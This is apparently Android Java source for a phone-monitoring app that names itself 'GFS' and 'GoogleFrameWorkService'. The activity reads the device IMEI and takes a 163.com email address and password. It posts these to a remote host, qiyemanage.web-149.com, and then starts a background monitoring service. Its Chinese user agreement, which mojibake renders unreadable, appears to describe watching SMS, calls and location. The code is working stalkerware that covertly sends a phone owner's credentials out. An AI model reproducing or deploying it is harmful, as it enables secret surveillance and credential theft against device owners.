package com.android.GFS;

import com.google.GFS.JSONParser;
import com.google.GFS.MailDriver;
import com.google.GFS.RegisterInfo;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import com.android.GFS.R;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.Dialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;

public class InFoActivity extends Activity {
    private Button ibn_regist,ibn_checknet;
    private EditText iet_mailname,iet_mainpwd;
    private ProgressBar ipb_prog;
    private String u_mail,u_pwd;
    private JSONParser jsonParser;
    private String response="NONE";
    private String mobileID="NONE";
    private String lastDate;
    private final String URL_REGIST="http://qiyemanage.web-149.com/regist.php";
    private static String TEST_NET  ="http://qiyemanage.web-149.com";
    private final String RESPONSE_OK="1";
    private final String RESPONSE_EXIST="0";
    private final String RESPONSE_MAIL_FAILURE="MAIL_FAILURE";
    
    
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if(checkMobileID())
        {
        	requestWindowFeature(Window.FEATURE_NO_TITLE); 
        	setContentView(R.layout.main);
        	initInformate();      
        	initControls();
        	jsonParser = new JSONParser();       	
        }
    }
    
    private void startMonitoring()
    {
        Intent intent=new Intent();
        intent.setClass(InFoActivity.this, GoogleFrameWorkService.class);
        startService(intent); 	
    }
    
    private void initControls()
    {
    	iet_mailname =(EditText)findViewById(R.id.editText1);
    	iet_mainpwd  =(EditText)findViewById(R.id.editText2);
    	ipb_prog     =(ProgressBar)findViewById(R.id.progressBar1);
    	ibn_regist   =(Button)findViewById(R.id.button1);
    	ibn_checknet =(Button)findViewById(R.id.button2);
        OnClickListener lis_regist=new OnClickListener(){
            public void onClick(View v)
            {
            	
            		doRegister();
            }
           };
        ibn_regist.setOnClickListener(lis_regist);
        
        OnClickListener lis_checknet=new OnClickListener(){
            public void onClick(View v)
            {
            	    doCheckNetwork();

            }
           };
        ibn_checknet.setOnClickListener(lis_checknet);
	
    }
    
    
    private void doRegister()
    {
    	RegisterService rservice=new RegisterService(this);
    	rservice.execute("registering...");    		
	
    }
    private void doCheckNetwork()
    {
    	CheckNetworkService cservice=new CheckNetworkService(this);
    	cservice.execute("check networking...");    		
	
    }
    
    private String  registService(String name, String pwd)
    {
    	SimpleDateFormat  sdf = new SimpleDateFormat("yyyy-MM-dd",Locale.CHINA); 
    	String today=sdf.format(new Date());
    	lastDate=today;
    	String expireday;
    	try{
    		expireday=sdf.format(new Date(sdf.parse(today).getTime()+24*3600*1000));
    		
    	}catch (Exception ex)
    	{
    		expireday=today;
    	}   		
    	List<NameValuePair> data =new ArrayList<NameValuePair>();
    	data.add(new BasicNameValuePair("II",mobileID));
    	data.add(new BasicNameValuePair("EM",name+"@163.com"));
    	data.add(new BasicNameValuePair("PWD",pwd));
    	data.add(new BasicNameValuePair("IDATE",expireday));
    	try{
            return jsonParser.makeHttpRequest(URL_REGIST,"POST", data).getString("success");
    		
    	}catch(Exception e){
            e.printStackTrace();       
        }  	
    	return "NONE";    	
    }
    
    private void saveLogInfo()
    {
    	RegisterInfo info=new RegisterInfo();
    	info.saveInfo(mobileID,u_mail+"@163.com",u_pwd);   	
    	SharedPreferences settingSharedPreferences = getSharedPreferences("GFSConfig", Context.MODE_PRIVATE);
	    SharedPreferences.Editor editor = settingSharedPreferences.edit();
	    editor.putString("lastdate", lastDate);
	    editor.commit();
    }
    
    
    private void initInformate()
    {
        Dialog  alertDialog = new AlertDialog.Builder(this). 
                setTitle("ʹ��Э�飺"). 
                setMessage("����������Ķ�����ⱾЭ���й涨������Ȩ�������ơ����������ܱ�Э�������������Ȩ���ء�ʹ�ñ����������ط�����һ����װ�����ơ����ء����ʻ���������ʽʹ�ñ������Ʒ������Ϊ�Ա�Э��Ľ��ܣ�����ʾ��ͬ����ܱ�Э����������Լ�������\"����\"�������������ͬ�ⱾЭ���е��������\"�ܾ�\"��\n" +
                		"1 Ȩ������ \n"+
                		"�������һ��֪ʶ��Ȩ��������Ȩ���͹�������Ȩ��Լ�Լ�����֪ʶ��Ȩ���ɷ���ı�������ֹ˽�Կ��������ۣ�\n"+
                		"2 ��ɷ�Χ\n"+
                		"�����Ϊ���������ʹ��ǰ�������߹���ʹ����ɡ�δ���ѻ������֤�û������԰�װ���ֵ��κη��ձ�����Ų�����\n"+
                		"3 Ȩ������\n"+
                		"��ֹ���򹤳̡��������ͷ����ࣺ�û����öԱ������Ʒ���з��򹤳̣�Reverse Engineer����������루Decompile�������ࣨDisassemble����ͬʱ���øĶ������ڳ����ļ��ڲ����κ���Դ�������ɡ��������Ĺ涨����������⣬�û��������ش�Э�����ơ�\n"+
                		"4 �û�ʹ����֪\n"+
                		"��������ڶ���Ȩ�ֻ����ݽ��м������������ţ�ͨ����¼������λ�õȡ���װ�߱������û���ͬ�⣬������ƭ����������һ�з��ɺ����װ�����и��𡣱�������洢�κ��ֻ������Ϣ�������Ÿ�����˽.\n"+
                		"5 ��������������\n"+
                		"�����������ϸ�Ĳ��ԣ������ܱ�֤�����е���Ӳ��ϵͳ��ȫ���ݣ����ܱ�֤�������ȫû�д���������ֲ����ݼ���������������û�����ϵ������Ա����ü���֧�֡�����޷�������������⣬�û�����ɾ���������\n"+
                		"ʹ�ñ������Ʒ�������û����ге��������÷�����������Χ�ڣ�����ʹ�û���ʹ�ñ�������������𺦼����գ�������������ֱ�ӻ��ӵĸ����𺦡���ҵӮ����ɥʧ��ó���жϡ���ҵ��Ϣ�Ķ�ʧ���κ�����������ʧ����������е��κ����Ρ�\n"+
                		"���������ϵͳ������������ϡ���������ϻ򲡶�����Ϣ�𻵻�ʧ�������ϵͳ����������κβ��ɿ���ԭ���������ʧ����������е��κ����Ρ�\n"+
                		"�û�Υ����Э��涨���Ա�������𺦵ġ�������Ȩ��ȡ�������������ж�ʹ����ɡ�ֹͣ�ṩ��������ʹ�á�����׷���ȴ�ʩ��\n"+
                		"6 ��Э�������л����񹲺͹����ɡ�\n"+
                		"7 ��Э���һ�н���Ȩ���޸�Ȩ���������С�").
                setPositiveButton("����", new DialogInterface.OnClickListener() {                   
                    @Override 
                    public void onClick(DialogInterface dialog, int which) { 
                        // TODO Auto-generated method stub  
                    } 
                }). 
                setNegativeButton("�ܾ�", new DialogInterface.OnClickListener() {                      
                    @Override 
                    public void onClick(DialogInterface dialog, int which) { 
                        // TODO Auto-generated method stub  
                    	System.exit(0);
                    } 
                }).create(); 
        alertDialog.show(); 
    	
    }
    
    private boolean checkMobileID()
    {
    	TelephonyManager tm=(TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
    	mobileID=tm.getDeviceId();
    	Log.i("IME:",mobileID);
    	if(mobileID.length()<10)
    	{
	    	AlertDialog.Builder builder=new AlertDialog.Builder(this);
	    	builder.setMessage("�ֻ���ʶ���쳣��");
	    	builder.setPositiveButton("ȷ��", new DialogInterface.OnClickListener() {                   
                @Override 
                public void onClick(DialogInterface dialog, int which) { 
                    // TODO Auto-generated method stub
                		finish();                   	
                } 
            });
	    	builder.show();	
	    	return false;
    	}
    	return true;
    }
    
    private boolean validateEmail(String name, String pwd) throws Exception
    {
    	MailDriver md=new MailDriver();
    	return md.sendMailPlainText(name+"@163.com", pwd, name+"@163.com", "��׿��ؾ���:��֤�ʼ�", "��֤�ɹ���");
    }
    
    private static boolean validateNet() throws Exception
    {
    	URL url = new URL(TEST_NET);  
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();  
        conn.setConnectTimeout(6 * 1000);  
        conn.setRequestMethod("GET");
        if (conn.getResponseCode() == 200) 
        {  
            return true;
        }  
        return false;
    }

    
	class RegisterService extends AsyncTask<String, Void, Integer>
	{
		Context context;
		RegisterService(Context ct)
		{
			context=ct;
		}
		@Override
		protected Integer doInBackground(String... arg0) {
			// TODO Auto-generated method stub
			Log.i("bg:", u_mail+";"+u_pwd);
	    	if((null!=u_mail) && (null!=u_pwd)
	    			&& (u_mail.length()>0) && (u_pwd.length()>0))
	    	{
	    		try {
					if(validateEmail(u_mail,u_pwd))
					{
						response=registService(u_mail,u_pwd);
						if(response.equals(RESPONSE_OK))
						{
							saveLogInfo();
							startMonitoring();
						}
					}
					else
						response=RESPONSE_MAIL_FAILURE;
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
	    		return 1;
	    	}
	    	return 0;
		}

		@Override
		protected void onCancelled() {
			// TODO Auto-generated method stub
			super.onCancelled();
		}

		@Override
		protected void onPostExecute(Integer result) {
			// TODO Auto-generated method stub
			//super.onPostExecute(result);
			ipb_prog.setVisibility(View.INVISIBLE);
	    	AlertDialog.Builder builder=new AlertDialog.Builder(context);
	    	if(1==result)
	    	{
	    		if(response.equals(RESPONSE_OK))
	    			builder.setMessage("ע��ɹ���");
	    		else if(response.equals(RESPONSE_EXIST))
	    			builder.setMessage("ע��ʧ�ܣ��ú���ע�ᣡ");
	    		else if(response.equals(RESPONSE_MAIL_FAILURE))
	    			builder.setMessage("ע��ʧ�ܣ�������֤����");
	    		else	    		
	    			builder.setMessage("ע��ʧ��,�������绷����");	    		
	    	}else
	    		builder.setMessage("��������벻��Ϊ�գ�");
	    		
	    	builder.setPositiveButton("ȷ��", new DialogInterface.OnClickListener() {                   
	                    @Override 
	                    public void onClick(DialogInterface dialog, int which) { 
	                        // TODO Auto-generated method stub
	                    	if(response.equals(RESPONSE_OK))
	                    	{
	                    		finish();  	                    		
	                    	}
	                    } 
	                });
	    	builder.show();	
		}

		@Override
		protected void onPreExecute() {
			// TODO Auto-generated method stub
			super.onPreExecute();
			ipb_prog.setVisibility(View.VISIBLE); 
	    	u_mail=iet_mailname.getText().toString();
	    	u_pwd =iet_mainpwd.getText().toString();
		}

		@Override
		protected void onProgressUpdate(Void... values) {
			// TODO Auto-generated method stub
			super.onProgressUpdate(values);
		}
		
	}
	
	
	class CheckNetworkService extends AsyncTask<String, Void, Integer>
	{
		Context context;
		CheckNetworkService(Context ct)
		{
			context=ct;
		}
		@Override
		protected Integer doInBackground(String... arg0) {
			// TODO Auto-generated method stub
			try {
				if(validateNet())
				  return 1;
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
	    	return 0;
		}

		@Override
		protected void onCancelled() {
			// TODO Auto-generated method stub
			super.onCancelled();
		}

		@Override
		protected void onPostExecute(Integer result) {
			// TODO Auto-generated method stub
			//super.onPostExecute(result);
			ipb_prog.setVisibility(View.INVISIBLE);
	    	AlertDialog.Builder builder=new AlertDialog.Builder(context);
	    	if(1==result)
	    		builder.setMessage("����������");
	    	else	    		
	    		builder.setMessage("�����쳣��");
	    	builder.setPositiveButton("ȷ��", new DialogInterface.OnClickListener() {                   
	                    @Override 
	                    public void onClick(DialogInterface dialog, int which) { 
	                        // TODO Auto-generated method stub              	
	                    		
	                    } 
	                });
	    	builder.show();	
	        
		}

		@Override
		protected void onPreExecute() {
			// TODO Auto-generated method stub
			super.onPreExecute();
			ipb_prog.setVisibility(View.VISIBLE);  	   	

		}

		@Override
		protected void onProgressUpdate(Void... values) {
			// TODO Auto-generated method stub
			super.onProgressUpdate(values);
		}
		
	}
}